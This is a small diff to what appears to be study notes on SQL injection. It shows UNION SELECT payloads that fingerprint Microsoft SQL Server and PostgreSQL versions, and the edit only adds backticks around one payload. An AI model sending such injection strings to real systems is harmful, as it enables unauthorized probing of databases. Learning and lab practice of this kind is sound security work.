@@ -122,7 +122,7 @@ select version()
         - step one
             - give version and detecting database type
                 - microsoft
-                    - ' UNION SELECT @@version,'James'--
+                    - `' UNION SELECT @@version,'James'--`
                     - ' UNION SELECT @@version,NULL--
                 - PostgreSQL ✅
                     - ' UNION SELECT version(),'Marduk'--
